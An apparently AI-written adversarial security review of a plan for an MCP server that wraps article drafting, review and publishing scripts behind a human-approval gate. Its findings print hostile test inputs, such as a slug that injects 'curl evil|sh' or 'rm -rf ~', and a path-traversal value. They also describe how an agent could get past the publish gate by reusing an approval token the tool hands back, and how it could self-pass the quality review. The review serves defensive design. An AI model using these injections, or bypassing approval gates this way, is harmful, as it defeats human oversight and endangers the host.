# Adversarial Plan Review — factory-mcp 6-Verb Tool Surface

**Date:** 2026-07-07
**Reviewer:** Fable 5 (independent adversarial review; did not author spec or plan)
**Spec:** `docs/superpowers/specs/2026-07-07-factory-mcp-design.md`
**Plan:** `docs/superpowers/plans/2026-07-07-factory-mcp.md`
**Verdict:** **REVISE** — 1 Blocker, 4 High, 5 Medium, 5 Nit. The plan is unusually well-grounded (every "verified" CLI claim checked TRUE against the real scripts), but the security-critical verb hands out the human-approval bypass token in every response, and the banked spec/plan pair contradict each other in ways a future implementer will trip on.

---

## Ground truth independently verified (repo spot-checks)

| Claim in plan | Verified against | Result |
|---|---|---|
| `sonnet_writer.py` args: `--site --slug --brief --keywords(nargs=+) --words --batch` | `command-post/sonnet_writer.py:716-729` | TRUE (`--batch` is `BooleanOptionalAction`; `--brief` is a file path; words default 1800) |
| `image_pipeline.py --provider` REQUIRED, choices `openai/xai/openrouter`; `--all` dest `run_all`; `--stage` default `all` | `image_pipeline.py:1452-1467` | TRUE |
| `content_assembler.py --slug --dry-run` only | `content_assembler.py:1005-1007` | TRUE |
| `content_reviewer.py --slug --site --audit-all --audit-published --dry-run --fix`; `--fix` writes `review_status:"passed"` directly; exit 0 pass / 1 fail-or-not-found | `content_reviewer.py:362-368, 375-394` | TRUE |
| `wp_publisher.py` computes `dry_run = not args.approve`; `--schedule` effective only WITH `--approve`; dry-run+schedule prints "Would schedule" and returns before any WP call; `--ack-jose-approved` is a no-op for the script ("pure intent-signal for the hook") | `wp_publisher.py` main() + `publish()` dry-run return (`status: dry_run_ok`) | TRUE |
| `tpi_publisher.py`: mutex `--slug|--all` required; `--dry-run` wins if both; `--schedule`+`--all` exits 2; schedule queue written only on approve path | `tpi_publisher.py:546-611`; **critically**: the dry-run early-return (§10, "No files written") executes BEFORE the §12a `tpi_schedule_queue.append()` — so `--dry-run --schedule` can never enqueue a deferred publish | TRUE — no gate bypass via the hourly runner |
| `db.py` import chain stdlib-only | `db.py` imports `sqlite3/datetime/pathlib/typing` + `lib.common`; `lib/common.py` imports `fcntl/json/os/datetime/pathlib`; `lib/__init__.py` empty | TRUE |
| No `sys.path` shadowing hazard today | `command-post/*.py` ∩ `sys.stdlib_module_names` = ∅ | TRUE (theoretical risk only, as author says) |
| `sonnet_writer` upserts DB (`stage="in_progress"`) + `export_queue_json()` | `sonnet_writer.py:699-708` | TRUE — `resulting_state` re-reads are genuinely fresh (scripts commit + exit before the tool re-reads; `db.get_db()` opens a fresh WAL connection per call) |
| Guard hook is Bash-only | `~/.claude/hooks/guard_wp_publish.py:16-18` (`tool_name != "Bash" → exit 0`) + `settings.json` `PreToolUse` matcher `"Bash"`; regex targets only `wp_publisher\.py.*--approve` (tpi_publisher is not hook-guarded at all) | TRUE — the in-tool gate is the SOLE gate on the MCP path |
| Scaffold/venv facts | `pyproject.toml` has `[project.scripts]`; `.venv` has `mcp 1.27.1` + `anyio 4.13.0`, no pytest yet; `__main__.py` exists; `server.py:24-30` paths block and `call_tool` fallthrough match the plan's edit anchors | TRUE |
| Per-task test counts 5/13/20/25/28/32/40 | Counted tests per file in the plan | Arithmetic checks out (5, +8, +7, +5, +3, +4, +8) |

---

## Findings

### BLOCKER

**B1. `operator_command` fabricates the human-approval token — it pre-composes `--ack-jose-approved` into every `factory_publish` response.**
*Location:* plan Task 7 Step 3, `_operator_command()` (plan ~lines 1542-1548); locked in by `test_publish_default_dry_run_wp_mapping` (~1441-1444) and the refusal test (~1484).
*Why it's a defect:* The entire point of `--ack-jose-approved` (per the hook's own docstring) is that it is "deliberately long and project-specific so it can never be typed by habit or accident" and may be typed by Claude ONLY after Jose's textual go-ahead. The MCP response places the complete, ready-to-run, hook-passing live-publish command into the calling agent's context on **every** publish preview — including the `dry_run:false` refusal, whose `message` explicitly invites running it. An agent that just drafted+reviewed an article and misreads conversational context as a go-ahead can copy `operator_command` into Bash; the hook sees `--ack-jose-approved` and ALLOWS. The tool that is "structurally unable to publish live" thereby actively degrades the neighboring channel's gate from "deliberate human-approved marker" to "string I was just handed." For TPI it's worse: `tpi_publisher.py --approve` has no hook guard at all, so the returned command is immediately executable by the agent with zero remaining gate.
*Fix (small, but mandatory):* `_operator_command` must NOT emit `--ack-jose-approved`. Return the un-acked command (`... --approve`) — the Bash hook will then deny and force the deliberate ack step exactly as designed — or better, return a non-executable instruction object, e.g. `{"next_step": "Get Jose's explicit go-ahead, then run: python3 command-post/wp_publisher.py --slug <slug> --approve (the publish guard will require the ack flag)"}`. Update `test_publish_default_dry_run_wp_mapping` and the refusal test accordingly (the smoke's `"--approve" in operator_command` check can stand). Add one test asserting `"--ack-jose-approved" not in operator_command`.

### HIGH

**H1. No slug charset validation; slug is interpolated unquoted into a string designed to be executed in a shell.**
*Location:* `_no_dash`/`_required_str` (plan Task 2, ~lines 596-609) as the ONLY string guard; `_operator_command`'s `" ".join(parts)` (Task 7).
*Why:* `_no_dash` (correctly ordered after `.strip()`) is sufficient for **argv flag injection** — argv is a list, `shell=False`, so `slug="x --approve"`, `=`-embedded, and unicode-dash variants all land as single non-flag *values*; the 12-combo sweep plus structural argv construction genuinely close that hole. But slug may still contain spaces, `;`, `$( )`, backticks, newlines — and it is pasted verbatim into `operator_command`, a string the plan tells a human/agent to execute. `slug="x; curl evil|sh"` yields an operator_command that executes the payload on paste (note the `dry_run:false` refusal path returns operator_command *without any preview run that would have exposed the bogus slug*). Slug is also a filesystem path component for every wrapped script (`find_pipeline_dir(slug)`, `content-pipeline/<site>/<date>/<slug>/`), so path-shaped slugs (`../../…`) reach glob/mkdir logic.
*Fix:* Add a `_slug(arguments)` validator used by ALL verbs: `re.fullmatch(r"[a-z0-9][a-z0-9-]{0,80}", slug)` (covers every real slug incl. `factory-smoke-YYYYMMDD`; widen deliberately if a legacy slug needs it). Additionally `shlex.quote()` every part in `_operator_command` (belt-and-braces even after B1's fix). Add hostile-input publish tests (`slug="--approve"`, `slug="x; rm -rf ~"`, `slug="../../etc"` → ValueError, no subprocess).

**H2. `fix` must be dropped from the `factory_review` MCP surface (author flag 4, adjudicated: REMOVE).**
*Location:* plan Task 6 (schema `fix`, mapping `--fix`, `test_review_site_and_fix_mapping`); spec §3.2 row (`fix?`).
*Why:* Verified: `content_reviewer.py --fix` writes `review_status:"passed"` into the article JSON and exits 0 — it is a self-green of the mandatory quality gate, the exact gate class CLAUDE.md marks NEVER-skip ("Lesson 2026-04-09"). The schema's "Requires Jose's explicit instruction" is a description-level plea with zero enforcement — precisely the pattern this design rejects for `--approve`. The symmetry argument is airtight: live publish is operator-CLI-only; the review override must be too.
*Fix:* Remove `fix` from the tool schema, the arg-mapping, and the tests; replace with a test asserting `--fix` never appears in review argv (add `--fix` to the Task 9 grep guard and to the runner denylist of H3). Edit spec §3.2 (`slug, site?, fix?` → `slug, site?`).

**H3. The stated absolute gate has no runtime enforcement layer — add a forbidden-flag denylist in `runner.run_script()` (author flag 6, adjudicated: CONFIRM, but the fix belongs IN this plan, not "later").**
*Location:* plan Global Constraints "THE PUBLISH GATE" (line ~38) vs `runner.py` (Task 1).
*Why:* The constraint "no code path may ever place `--approve` … into a subprocess argv" is currently enforced only by unit tests (compile-time confidence) and a Task 9 grep (text-level). Since the Bash hook demonstrably does not see MCP calls, `run_script()` is the single chokepoint every verb — including future verbs written by future sessions — must pass. A five-line runtime check converts the plan's prose constraint into a mechanism.
*Fix:* In `run_script()`: `FORBIDDEN = frozenset({"--approve","--ack-jose-approved","--force","--rebuild","--all","--batch","--audit-all","--audit-published","--fix"})`; for each arg, if `arg.split("=",1)[0]` ∈ FORBIDDEN → return the structured-failure envelope (or raise; either surfaces as isError). One unit test in `test_runner.py`. Optionally note the post-plan follow-up (PreToolUse hook matching `mcp__factory-mcp__.*`, or an env token required by the publishers for `--approve`) in the README — out of scope is fine once the runner layer exists.

**H4. The banked spec/plan pair contradict each other while the plan header declares the spec "source of truth" — the divergences must be written back into the spec (author flags 1/4/5/7, adjudicated: CONFIRM the resolutions, REQUIRE the doc edit).**
*Location:* plan line 5 ("Spec (source of truth)") vs: spec §3.3 "supports `schedule` (writes the schedule queue)" [now false — and verified false-for-good-reason: both publishers gate schedule effects behind `--approve`]; spec §1 criterion 2 "streaming progress" [implemented as capture+tail]; spec §3.2 table `brief?` [now `brief_path`], `provider` [required, 3 choices], `fix?` [removed per H2], dotted tool names [invalid on the wire].
*Why:* This is a *banked* pair meant to be executed later by fresh-context agents that are explicitly told the spec is the source of truth and "do not guess a fix that isn't in this plan." When plan and spec disagree, that instruction set is self-contradictory — the classic expensive-at-implementation-time defect. The `schedule` resolution itself is RIGHT (the alternative — MCP writing `tpi-schedule-queue.json`, which the hourly runner then live-publishes — would be a real gate bypass and correctly rejected); it just isn't allowed to live only in a plan footnote.
*Fix:* Amend the spec: §3.3 "supports `schedule` (validate + dry-run preview + returned operator command; the MCP never writes the schedule queue)"; §1 criterion 2 "capturing output and returning a structured result (tail); MCP progress notifications deferred"; §3.2 table updated (`brief_path`, provider enum/required, drop `fix`, note snake_case wire names). Alternatively add a "Spec deltas — this section wins" block at the top of the plan; editing the spec is cleaner since both documents are being banked together.

### MEDIUM

**M1. Long verbs: orphaned grandchildren on timeout, and no story for the registered client's tool-call timeout.**
*Location:* `runner.run_script` (Task 1); Task 8 Step 3 registration.
*Why:* `subprocess.run(timeout=...)` on expiry kills only the direct child. `sonnet_writer.py` spawns the `claude` CLI as a grandchild — after a 2400s kill, the CLI can keep running, keep consuming the Max session, and keep writing files/DB rows *after* the envelope reported `timed_out:true` (confusing later `resulting_state` reads, and inviting an agent retry → duplicate drafts). Separately, the smoke sets `read_timeout_seconds=2700`, but the *registered* consumer is Claude Code, whose MCP tool-call timeout is neither confirmed nor configured anywhere in the plan — a client-side abort mid-draft leaves the same orphan + retry hazard.
*Fix:* `subprocess.run(..., start_new_session=True)` and on `TimeoutExpired` kill the process group (`os.killpg`) before returning the envelope; one test. In Task 8, verify/document the client timeout (e.g. `MCP_TOOL_TIMEOUT`) covers `DRAFT_TIMEOUT_S`, and note MCP progress notifications as the eventual fix (ties to H4's criterion-2 rewording).

**M2. `state.py`'s import side effect is understated, unit tests touch the production DB, and author note 2(c) is factually off.**
*Location:* `state.py` docstring + `import db` (Task 2); plan-author note 2.
*Why:* `db.py:770` runs `init_db()` at import, which is not just "idempotent CREATE TABLE + mkdir": `_migrate_cost_daily_provider` (db.py:210-231) performs `ALTER TABLE` + an `UPDATE` backfill — a schema migration executed by the "read-only" MCP at every server start, and by every unit-test run at collection time *against the real `state/jarvis.db`* (the monkeypatch of `state._db.DB_PATH` happens after import). Idempotent + WAL + 30s timeout makes this acceptable on this box, but it must be named. Note 2(c) is also wrong in the general case: `DB_PATH = Path(__file__).parent.parent/"state"` follows the *imported* `db.py`'s location, and `state.py` imports it from `$JARVIS_PROJECT_DIR/command-post` — so a real relocation DOES move the SQLite reads along with it; the actual failure mode of a bogus `JARVIS_PROJECT_DIR` is a loud `ImportError` at server start (no `db` module elsewhere on the path), not silently-wrong reads.
*Fix:* Correct the `state.py` docstring ("runs init_db() including the cost_daily provider migration") and note 2(c); optionally have `tests/conftest.py` set `JARVIS_PROJECT_DIR` to a tmp fixture tree before first import if prod-DB-touching tests are unacceptable — otherwise document the accepted touch.

**M3. Unknown/typo'd argument keys are silently swallowed — on `factory_publish` this has a live-publish-shaped consequence.**
*Location:* all verb handlers (`arguments.get(...)`); no `additionalProperties: false` in any schema.
*Why:* A caller passing `{"slug": "x", "schdule": "2026-08-01T14:00:00Z"}` (or `when`, or `publish_at`) gets a clean `ok:true` dry-run with NO schedule — and an `operator_command` **without** `--schedule`. The operator then runs it and publishes *immediately* instead of at the intended time. Same class: `{"approve": true}` is silently ignored and the caller may read `ok:true` as "published". mcp-builder's no-silent-failure rule covers exactly this.
*Fix:* Shared `_reject_unknown_keys(arguments, allowed)` at the top of each verb (ValueError listing the unknown keys + allowed set), plus `"additionalProperties": false` in the schemas. Also confirm whether mcp 1.27's `@server.call_tool()` input validation is active (it changes error *shape*, not this gap — extra keys pass schema validation unless additionalProperties is false).

**M4. The Rollback section can rewind live pipeline state.**
*Location:* plan "Rollback" (lines ~1936-1948) vs Global Constraints heartbeat note (line ~16).
*Why:* The heartbeat auto-committer commits `state/` + `content-pipeline/` (tracked files) to whatever branch is checked out. After days on `feat/factory-mcp-verbs`, `git checkout main && git branch -D feat/factory-mcp-verbs` reverts tracked state files (queue.json, publishing-log.json, content-pipeline artifacts) on disk to main's *older* content and discards the interim auto-commits — real pipeline mutations lost, not just plan artifacts. "No other state is mutated by this plan" is true of the plan's code but not of the branch the daemon has been committing to.
*Fix:* Rollback must either merge/cherry-pick the `Auto-commit` commits back to main before deleting the branch, or (simpler) regenerate the derived files from the untracked DB after checkout: `cd command-post && /usr/bin/python3 -c "import db; db.export_queue_json(); db.export_publishing_log_json()"` — and state that content-pipeline auto-commits should be inspected before `-D`.

**M5. `brief_path` is an unconstrained absolute path handed to a model-facing reader.**
*Location:* Task 3 schema/`draft()`; verified `sonnet_writer.py` `json.loads(Path(args.brief).read_text())` (warns-and-continues if missing).
*Why:* Any readable JSON file — including `~/.openclaw/credentials/*.json` — can be fed in as the "brief" whose fields (`title`, `search_location`, `target_keywords`) flow into the draft prompt and output JSON. Exfil value is limited (keys don't match), but the MCP surface exists precisely for less-trusted agent callers, and the plan validates flag-shape but not path confinement.
*Fix:* Require `brief_path` to resolve under an allowlist (`BASE_DIR` and/or `~/seo-workspace`) via `Path.resolve().is_relative_to(...)`; ValueError otherwise. One test.

### NIT

**N1.** `_STAGES` in `verbs.py` duplicates the stage list in `db.export_queue_json()` (db.py:720-723) — third copy counting the `factory_status` schema enum. Drift risk; source one from the other or add a comment cross-pinning them. Note the DB also uses `stage="scheduled"` (written by `tpi_publisher.py` §12a) which is in NONE of the lists — a scheduled article is invisible to `factory_status --stage` filtering and lands in no `queue.json` bucket; at minimum add `scheduled` to `_STAGES` and the schema enum.

**N2.** Tool-description truthfulness: `factory_status` says "Rows carry: slug, site, title, stage, …" but `SELECT *` returns 21 columns (also `primary_keyword`, `draft_cost`, `image_cost`, `published_at`, `qa_notes`, `notes`, batch ids); site examples mix dir-names and domains ("travelplaninfo" vs "travelsfy.com") — both conventions genuinely occur in the DB (tpi_publisher writes `site="travelplaninfo.com"`), worth saying so. Also `factory_review`'s `review_passed:false` conflates "review failed" with "slug not found" (both exit 1) — the description should tell the caller to read `stdout_tail` to distinguish.

**N3.** Task 8 Step 6 cleanup deletes `articles` rows and regenerates queue.json but does not touch `article_fts` / `article_costs` / `article-events.jsonl` entries for `factory-smoke-*` (whichever sonnet_writer actually writes — the plan verified only `upsert_article` + `export_queue_json`). Ghost FTS rows feed the duplicate-detector. Add `DELETE FROM article_fts WHERE slug LIKE 'factory-smoke-%';` (+ article_costs) and a note that events are append-only and intentionally left. Also `check("factory_status lists from SQLite", st["total"] >= 1)` assumes a non-empty prod DB — true today, but it's an environment assertion inside a "mechanics-hard" smoke.

**N4.** `pyproject` pins `mcp>=1.0` while the code and smoke are written against 1.27.1 behaviors (`ClientSession(read_timeout_seconds=...)`, low-level `Server`, anyio availability) — author flag 10 acknowledged; make it mechanical: `mcp>=1.27,<2`.

**N5.** `datetime.fromisoformat` accepts date-only (`2026-08-01`) and naive (`no Z/offset`) strings, so the "UTC ISO-8601" contract is looser than documented; the value flows into `operator_command` and eventually WP `date_gmt`. Tighten: require a parsed `datetime` with `tzinfo` and a time component (or regex `^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}(:\d{2})?(Z|[+-]\d{2}:\d{2})$`).

---

## Adjudication of the 11 plan-author self-flags

| # | Flag | Adjudication |
|---|---|---|
| 1 | `schedule` demoted from spec wording | **CONFIRM** — divergence is real and the resolution is correct (verified: both publishers gate schedule *effects* behind `--approve`; tpi's dry-run return precedes the queue write, so no bypass via the hourly runner). But the spec MUST be amended (H4), and `operator_command` is itself a foot-gun as built (B1/H1). |
| 2 | Subprocess-vs-import consequences | **CONFIRM with corrections** — stdlib-only chain TRUE (verified `lib/common.py` + empty `lib/__init__.py`); freshness TRUE (verified sonnet_writer:699-708); shadowing risk theoretical (zero stdlib collisions today). 2(c)'s env-var claim is inaccurate and the init_db side effect is understated (M2). |
| 3 | `resulting_state` reliability limits | **CONFIRM** — honest and correctly mitigated (skew exposed, not hidden). Note the un-listed `scheduled` stage (N1). |
| 4 | Real CLI shapes vs spec table | **CONFIRM** — every divergence checked TRUE against the six scripts. The `fix` question the author punted to review is resolved: REMOVE it (H2). Fold the divergences into the spec (H4). |
| 5 | Tool naming + `-`-reject guard | **CONFIRM** — snake_case is forced by the wire regex; strip-then-reject ordering is correct; the guard is sufficient for argv-flag injection (list argv, shell=False) but NOT for operator_command/paths — slug regex needed (H1). |
| 6 | Bash hook doesn't cover MCP | **CONFIRM (verified)** — hook exits 0 for non-Bash tools; also only matches wp_publisher (tpi unguarded even on Bash). Acceptable ONLY with the runner-level denylist added in-scope (H3) and B1 fixed; hook/env-token follow-ups can stay deferred. |
| 7 | "Streaming" implemented as capture+tail | **CONFIRM** — pragmatic, but it contradicts spec criterion 2 → spec edit (H4); interacts with client timeouts (M1). |
| 8 | Smoke mechanics-hard / editorial-soft | **CONFIRM** — the right trade; hard-asserting reviewer/publisher outcomes on an image-less 700-word throwaway would make the gate flaky. `assemble` hard-assert with stop-and-report is acceptable. |
| 9 | Timeouts are judgment calls | **DOWNGRADE-ish** — values are fine; the real gap is orphaned grandchildren + unpinned client timeout (M1), which the flag doesn't name. |
| 10 | Env couplings (heartbeat, mcp pin, test counts) | **CONFIRM** — pin it (N4); heartbeat interacts badly with the Rollback section specifically (M4); counts verified objective. |
| 11 | In-process DB read vs earlier subprocess draft | **CONFIRM** — in-process read is the right call given the verified stdlib-only chain and the spec §3.4 carve-out; the `state.*` interface keeps the swap cheap if isolation is ever wanted. |

---

## Answers to the specific review questions

- **Is the publish gate airtight?** The *argv* path is structurally sound: argv is a literal list (`["--slug", slug, "--dry-run"] (+ ["--schedule", ts])`), `shell=False`, all strings strip-then-`-`-rejected, `site` never enters argv, script names are hard-coded, `dry_run` uses an `is not True` identity check that fails safe for every non-`true` JSON value. `=`-embedded, unicode-dash, and space-containing inputs all land as single non-flag argv *values*; even a hypothetical missing `--dry-run` still can't go live because `wp_publisher` computes `dry_run = not args.approve` and both scripts exit 1 when neither flag is present. The 12-combo sweep is sound but is confidence, not the guarantee — the structure is. The gate's two real holes are *around* the argv: the response fabricates the Bash-channel approval token (B1) and there is no runtime second layer at the chokepoint (H3).
- **Schedule resolution:** right call, verified safe (dry-run returns precede all schedule writes in both publishers); spec must be corrected (H4); `operator_command` as an executable string is the foot-gun (B1/H1).
- **In-process db import:** claim TRUE; env-var note inaccurate but the failure mode is a loud startup ImportError, not wrong-DB reads; import-time migration must be named and tests currently touch the prod DB at import (M2). Mixing in-process reads with subprocess writes is coherent (fresh connection per read, WAL, child fully exited before re-read).
- **Bash-only hook:** confirmed; in-tool gate is the sole MCP gate → add the runner denylist in-scope (H3).
- **`--fix`:** remove from the MCP surface (H2).
- **`.venv`/pytest/subprocess mechanics:** verified workable (mcp 1.27.1 + anyio present; `[project.scripts]` anchor exists; `/usr/bin/python3` missing-script test's exit-2 expectation is correct; command-post's own `conftest.py` is not collected under `testpaths=["tests"]`).
- **Silent failures:** runner/state/queue errors all surface; the one silent-swallow class found is unknown-key arguments (M3).

---

**VERDICT: REVISE** — fix B1 (+ H1-H4, which are each small, precisely-located edits) and this plan is executable as designed; no architectural rework needed.
